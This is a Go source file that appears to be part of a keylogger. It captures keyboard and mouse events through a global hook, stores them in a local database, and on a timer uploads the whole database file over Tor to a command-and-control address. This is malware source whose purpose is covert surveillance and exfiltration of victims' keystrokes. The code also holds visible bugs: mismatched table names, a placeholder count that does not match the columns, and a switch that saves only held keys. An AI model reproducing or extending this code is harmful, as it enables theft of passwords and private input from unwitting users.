package subsroutines

import (
	"bytes"
	"context"
	"database/sql"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"os"
	"time"

	hook "github.com/cauefcr/ghook"
	"github.com/cretz/bine/tor"
)

func SaveEvent(db *sql.DB, e hook.Event) (sql.Result, error) {
	return db.Exec(`INSERT INTO eventos (kind,rawcode,button,x,y,clicks,amount,rotation,direction,when) values (?,?,?,?,?,?,?,?,?)`, e.Kind, e.Rawcode, e.Button, e.X, e.Y, e.Clicks, e.Amount, e.Rotation, e.Direction, e.When)
}

func CreateTable(db *sql.DB) {
	db.Exec(`CREATE TABLE IF NOT EXISTS events(
		id INT AUTOINCREMENT,
		when DATETIME,
		kind INT,
		rawcode INT,
		button INT,
		x INT,
		y INT,
		clicks INT,
		amount INT,
		rotation INT,
		direction INT
	)`)
}

func PostToURL(cc string, t *tor.Tor, data []byte) (string, error) {
	// dialCtx, dialCancel := context.WithTimeout(context.Background(), 30*time.Second)
	// defer dialCancel()
	// Make connection
	dialer, err := t.Dialer(context.Background(), nil)
	if err != nil {
		return "", err
	}
	httpClient := &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}
	// Wait at most a minute to start network and get
	values := map[string]string{"self": string(data)}

	jsonValue, err := json.Marshal(values)
	if err != nil {
		return "", err
	}

	resp, err := httpClient.Post(cc, "application/json", bytes.NewBuffer(jsonValue))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	return string(body), nil
}

func RunHook(t *tor.Tor, cc string, db *sql.DB, ev chan hook.Event, tick chan time.Time) chan error {
	errch := make(chan error, 1)
	go func() {
		for {
			select {
			case e := <-ev:
				switch e.Kind {
				case hook.KeyDown:
				case hook.KeyUp:
				case hook.KeyHold:
					SaveEvent(db, e)
				default:
					break
				}
			case <-tick:
				dbytes, err := os.ReadFile("./db.db")
				if err != nil {
					errch <- err
					break
				}
				PostToURL(cc, t, dbytes)
			}
		}
	}()
	return errch
}
